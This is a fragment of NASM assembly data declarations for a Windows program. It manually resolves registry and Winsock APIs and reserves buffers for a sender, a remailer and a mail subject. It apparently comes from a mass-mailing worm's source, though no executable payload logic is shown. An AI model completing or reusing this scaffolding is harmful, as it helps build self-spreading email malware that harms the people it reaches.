.apiname001 db "RegOpenKeyExA", 0
.apiname002 db "RegCloseKey", 0
.apiname003 db "RegQueryValueExA", 0

wsock32     db "WS2_32.DLL",0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
            dd 0
.apiname001 db "connect", 0
.apiname002 db "closesocket", 0
.apiname003 db "recv", 0
.apiname004 db "send", 0
.apiname005 db "WSAGetLastError", 0
.apiname006 db "WSAStartup", 0
.apiname007 db "WSACleanup", 0
.apiname008 db "socket", 0
.apiname009 db "gethostbyname", 0

%ifdef DEBUG
user32      db "USER32.DLL",0
.api001     dd .apiname001
.api002     dd .apiname002
            dd 0
.apiname001 db "MessageBoxA", 0
.apiname002 db "MessageBeep", 0

MessageBoxA equ user32.api001
MessageBeep equ user32.api002
SetFilePointer equ kernel32.api012
%endif

LoadLibraryA     equ kernel32.api001
FreeLibrary      equ kernel32.api002
CreateFileA      equ kernel32.api003
CloseHandle      equ kernel32.api004
ReadFile         equ kernel32.api005
GlobalAlloc      equ kernel32.api006
GlobalFree       equ kernel32.api007
Sleep            equ kernel32.api008
GetSystemTime    equ kernel32.api009
GetTickCount     equ kernel32.api010
WriteFile        equ kernel32.api011

RegOpenKeyExA    equ advapi32.api001
RegCloseKey      equ advapi32.api002
RegQueryValueExA equ advapi32.api003

connect          equ wsock32.api001
closesocket      equ wsock32.api002
recv             equ wsock32.api003
send             equ wsock32.api004
WSAGetLastError  equ wsock32.api005
WSAStartup       equ wsock32.api006
WSACleanup       equ wsock32.api007
socket           equ wsock32.api008
gethostbyname    equ wsock32.api009

LOADLIB equ LoadLibraryA
FREELIB equ FreeLibrary

mcall     dd 0
getpaddr  dd 0
getmhnd   dd 0
send_type dd 0

sender:
times 200h db 0

remailer:
times 200h db 0

subject_buffer:
times 200h db 0

distance1 equ cantconnect-distance0
distance2 equ retry1-distance0
distance3 equ retry2-distance0
distance4 equ first_retry-distance0

